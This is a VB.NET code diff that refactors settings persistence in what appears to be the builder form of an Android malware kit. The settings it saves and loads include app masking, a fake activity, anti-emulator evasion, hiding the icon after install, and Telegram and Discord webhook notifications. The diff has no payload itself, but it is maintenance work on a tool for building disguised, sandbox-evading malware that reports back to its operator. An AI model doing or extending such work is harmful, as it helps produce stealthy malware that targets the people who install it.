@@ -199,12 +199,12 @@ Partial Public Class Build
     ' Protection settings persistence
     Private Sub SaveProtectionSettings()
         Try
-            My.Settings("EnableProtection") = If(Me.chkEnableProtection IsNot Nothing, Me.chkEnableProtection.Checked.ToString(), "False")
-            My.Settings("PackageName") = If(Me.txtPackageName IsNot Nothing, Me.txtPackageName.Text, String.Empty)
-            My.Settings("MaskType") = If(Me.cbMaskType IsNot Nothing AndAlso Me.cbMaskType.SelectedItem IsNot Nothing, Me.cbMaskType.SelectedItem.ToString(), String.Empty)
-            My.Settings("FakeActivity") = If(Me.txtFakeActivity IsNot Nothing, Me.txtFakeActivity.Text, String.Empty)
-            My.Settings("AntiEmulator") = If(Me.chkAntiEmulator IsNot Nothing, Me.chkAntiEmulator.Checked.ToString(), "False")
-            My.Settings("HideIconAfterSetup") = GetHideIconAfterSetupChecked().ToString()
+            My.Settings.EnableProtection = If(Me.chkEnableProtection IsNot Nothing, Me.chkEnableProtection.Checked.ToString(), "False")
+            My.Settings.PackageName = If(Me.txtPackageName IsNot Nothing, Me.txtPackageName.Text, String.Empty)
+            My.Settings.MaskType = If(Me.cbMaskType IsNot Nothing AndAlso Me.cbMaskType.SelectedItem IsNot Nothing, Me.cbMaskType.SelectedItem.ToString(), String.Empty)
+            My.Settings.FakeActivity = If(Me.txtFakeActivity IsNot Nothing, Me.txtFakeActivity.Text, String.Empty)
+            My.Settings.AntiEmulator = If(Me.chkAntiEmulator IsNot Nothing, Me.chkAntiEmulator.Checked.ToString(), "False")
+            My.Settings.HideIconAfterSetup = GetHideIconAfterSetupChecked().ToString()
             My.Settings.Save()
         Catch
         End Try
@@ -212,26 +212,32 @@ Partial Public Class Build
 
     Private Sub LoadProtectionUiExtras()
         Try
-            If My.Settings("HideIconAfterSetup") IsNot Nothing Then
-                Dim hideIcon As Boolean = Convert.ToBoolean(My.Settings("HideIconAfterSetup").ToString())
-                If chkHideIconAfterSetup IsNot Nothing Then chkHideIconAfterSetup.Checked = hideIcon
-                If Not hideIcon AndAlso Me.Pi1 IsNot Nothing Then Me.Pi1.Tag = "-"
-            End If
+            Dim hideIcon As Boolean = False
+            Boolean.TryParse(My.Settings.HideIconAfterSetup, hideIcon)
+            If chkHideIconAfterSetup IsNot Nothing Then chkHideIconAfterSetup.Checked = hideIcon
+            If Not hideIcon AndAlso Me.Pi1 IsNot Nothing Then Me.Pi1.Tag = "-"
         Catch
         End Try
     End Sub
 
     Private Sub LoadProtectionSettings()
         Try
-            If Me.chkEnableProtection IsNot Nothing Then Me.chkEnableProtection.Checked = Convert.ToBoolean(If(My.Settings("EnableProtection") IsNot Nothing, My.Settings("EnableProtection").ToString(), "False"))
-            If Me.txtPackageName IsNot Nothing AndAlso My.Settings("PackageName") IsNot Nothing Then Me.txtPackageName.Text = My.Settings("PackageName").ToString()
-            If Me.cbMaskType IsNot Nothing AndAlso My.Settings("MaskType") IsNot Nothing Then
-                Dim mask = My.Settings("MaskType").ToString()
-                Dim idx As Integer = Me.cbMaskType.Items.IndexOf(mask)
+            Dim protectionOn As Boolean = False
+            Boolean.TryParse(My.Settings.EnableProtection, protectionOn)
+            If Me.chkEnableProtection IsNot Nothing Then Me.chkEnableProtection.Checked = protectionOn
+            If Me.txtPackageName IsNot Nothing AndAlso Not String.IsNullOrWhiteSpace(My.Settings.PackageName) Then
+                Me.txtPackageName.Text = My.Settings.PackageName
+            End If
+            If Me.cbMaskType IsNot Nothing AndAlso Not String.IsNullOrWhiteSpace(My.Settings.MaskType) Then
+                Dim idx As Integer = Me.cbMaskType.Items.IndexOf(My.Settings.MaskType)
                 If idx >= 0 Then Me.cbMaskType.SelectedIndex = idx
             End If
-            If Me.txtFakeActivity IsNot Nothing AndAlso My.Settings("FakeActivity") IsNot Nothing Then Me.txtFakeActivity.Text = My.Settings("FakeActivity").ToString()
-            If Me.chkAntiEmulator IsNot Nothing Then Me.chkAntiEmulator.Checked = Convert.ToBoolean(If(My.Settings("AntiEmulator") IsNot Nothing, My.Settings("AntiEmulator").ToString(), "False"))
+            If Me.txtFakeActivity IsNot Nothing AndAlso Not String.IsNullOrWhiteSpace(My.Settings.FakeActivity) Then
+                Me.txtFakeActivity.Text = My.Settings.FakeActivity
+            End If
+            Dim antiEmu As Boolean = False
+            Boolean.TryParse(My.Settings.AntiEmulator, antiEmu)
+            If Me.chkAntiEmulator IsNot Nothing Then Me.chkAntiEmulator.Checked = antiEmu
         Catch
         End Try
     End Sub
@@ -296,7 +302,7 @@ Partial Public Class Build
                 txtTelegramChatId.Text,
                 txtDiscordWebhook.Text
             }
-            My.Settings("NotifySettings") = String.Join(delim, parts)
+            My.Settings.NotifySettings = String.Join(delim, parts)
             My.Settings.Save()
         Catch
         End Try
@@ -304,7 +310,7 @@ Partial Public Class Build
 
     Private Sub LoadSettings()
         Try
-            Dim raw As String = If(My.Settings("NotifySettings") IsNot Nothing, My.Settings("NotifySettings").ToString(), String.Empty)
+            Dim raw As String = If(String.IsNullOrWhiteSpace(My.Settings.NotifySettings), String.Empty, My.Settings.NotifySettings)
             If Not String.IsNullOrEmpty(raw) Then
                 Dim delim As Char = ChrW(31)
                 Dim parts As String() = raw.Split(delim)
@@ -391,7 +397,7 @@ Public Module NotifySettingsHelper
     Public Function LoadNotifyConfig() As NotifyConfig
         Dim cfg As New NotifyConfig()
         Try
-            Dim raw As String = If(My.Settings("NotifySettings") IsNot Nothing, My.Settings("NotifySettings").ToString(), String.Empty)
+            Dim raw As String = If(String.IsNullOrWhiteSpace(My.Settings.NotifySettings), String.Empty, My.Settings.NotifySettings)
             If String.IsNullOrEmpty(raw) Then Return cfg
 
             Dim parts As String() = raw.Split(ChrW(31))
@@ -418,7 +424,7 @@ Public Module NotifySettingsHelper
                 If(cfg.TelegramChatId, String.Empty),
                 If(cfg.DiscordWebhook, String.Empty)
             }
-            My.Settings("NotifySettings") = String.Join(delim, parts)
+            My.Settings.NotifySettings = String.Join(delim, parts)
             My.Settings.Save()
         Catch
         End Try
